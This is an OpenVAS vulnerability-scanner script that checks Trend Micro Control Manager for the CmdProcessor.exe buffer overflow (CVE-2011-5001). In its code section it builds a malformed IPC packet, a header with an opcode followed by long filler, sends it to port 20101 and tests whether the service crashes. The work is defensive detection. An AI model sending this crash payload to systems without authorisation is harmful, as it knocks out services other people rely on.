###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_trendmicro_control_manager_cmdprocessor_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Trend Micro Control Manager 'CmdProcessor.exe' Buffer Overflow Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to cause buffer overflow
  condition or execute arbitrary code.
  Impact Level: System/Application";
tag_affected = "Trend Micro Control Manager version 5.5 Build 1250 Hotfix 1550 and prior";
tag_insight = "The 'CGenericScheduler::AddTask' function in cmdHandlerRedAlertController.dll
  in 'CmdProcessor.exe' fails to process a specially crafted IPC packet sent on
  TCP port 20101, which could be exploited by remote attackers to cause a
  buffer overflow.";
tag_solution = "Apply Critical Patch Build 1613 for Trend Micro Control Manager 5.5,
  For updates refer to http://downloadcenter.trendmicro.com/index.php?prodid=7";
tag_summary = "This host is running Trend Micro Control Manager and is prone to
  buffer overflow vulnerability.";

if(description)
{
  script_id(802876);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2011-5001");
  script_bugtraq_id(50965);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-07-02 17:04:06 +0530 (Mon, 02 Jul 2012)");
  script_name("Trend Micro Control Manager 'CmdProcessor.exe' Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47114");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/71681");
  script_xref(name : "URL" , value : "http://www.securitytracker.com/id?1026390");
  script_xref(name : "URL" , value : "http://www.zerodayinitiative.com/advisories/ZDI-11-345");
  script_xref(name : "URL" , value : "http://www.trendmicro.com/ftp/documentation/readme/readme_critical_patch_TMCM55_1613.txt");

  script_description(desc);
  script_summary("Check if Trend Micro Control Manager is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("openvas-https.inc");
include("http_keepalive.inc");

## Variable Initialization
req  = "";
res  = "";
header  = "";
exploit = "";
soc  = 0;
soc2 = 0;
host = "";
tmp = "";

## Check the port status
## Vulnerable CmdProcessor Port
cmdPort = 20101;

## Check port status
if(!get_port_state(cmdPort)){
  exit(0);
}

##  Open tcp socket
soc = open_sock_tcp(cmdPort);
if(!soc){
  exit(0);
}

close(soc);

## HTTPs port
tmcmport = 443;

## Check port state
if(!get_port_state(tmcmport)){
  exit(0);
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Application Confirmation
## Construct basic GET request
req = string("GET /WebApp/Login.aspx HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n");

res = https_req_get(port: tmcmport, request: req);

if(res && ">Control Manager" >< res && "Trend Micro Incorporated" >< res)
{
  ## Construct a malformed request
  header = raw_string(0x00, 0x00, 0x13, 0x88,                        ## Buffer Size
                      crap(data:raw_string(0x41), length: 9),        ## Junk data
                      0x15, 0x09, 0x13, 0x00, 0x00, 0x00,            ## Opcode
                      crap(data:raw_string(0x41), length: 25),       ## Junk data
                      0xfe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                      0xff, 0xff, 0xf4, 0xff, 0xff, 0xff, 0x41);

  tmp = raw_string(crap(data:raw_string(0x41), length: 32000));
  exploit = header + tmp + tmp + tmp + tmp + tmp;

  soc = open_sock_tcp(cmdPort);
  if(!soc){
    exit(0);
  }

  ## Sending malformed  Request
  send(socket:soc, data: exploit);
  close(soc);

  sleep(5);
  soc2 = open_sock_tcp(cmdPort);
  if(!soc2)
  {
    security_hole(cmdPort);
    exit(0);
  }
  close(soc2);
}
